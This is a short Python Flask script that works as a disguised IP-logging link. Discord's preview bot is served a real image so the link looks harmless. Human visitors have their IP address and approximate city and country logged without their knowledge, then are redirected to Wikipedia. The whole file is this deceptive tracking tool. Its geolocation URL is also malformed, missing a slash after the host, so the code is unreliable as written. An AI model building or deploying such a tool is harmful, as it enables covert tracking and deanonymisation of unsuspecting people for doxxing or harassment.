from flask import Flask, request, send_file, redirect
import requests

app = Flask(__name__)

def get_location_data(ip_address):
    if not ip_address or ip_address in ['127.0.0.1', 'Unknown IP']:
        return "Unknown Country", "Unknown City"
        
    try:
        url = f"https://ipapi.co{ip_address}/json/"
        response = requests.get(url, timeout=3, headers={'User-Agent': 'Mozilla/5.0'})
        
        if response.status_code == 200:
            data = response.json()
            if not data.get('error'):
                country = data.get('country_name', 'Unknown Country')
                city = data.get('city', 'Unknown City')
                return country, city
    except Exception as e:
        print(f"[ERROR] Geolocation lookup failed: {e}")
        
    return "Unknown Country", "Unknown City"

@app.route('/image.png')
def conditional_serve():
    user_agent = request.headers.get('User-Agent', '')
    
    if "UptimeRobot" in user_agent:
        return "OK", 200

    ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_header:
        client_ip = ip_header.split(',')[0].strip()
    else:
        client_ip = 'Unknown IP'
    
    country, city = get_location_data(client_ip)
    
    if "Discordbot" in user_agent:
        print(f"[LOG] Discord Bot detected | IP: {client_ip} | Location: {city}, {country} | Serving preview.")
        return send_file('actual_image.png', mimetype='image/png')
    else:
        print(f"[LOG] User browser detected | IP: {client_ip} | Location: {city}, {country} | Redirecting.")
        return redirect("https://wikipedia.org")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
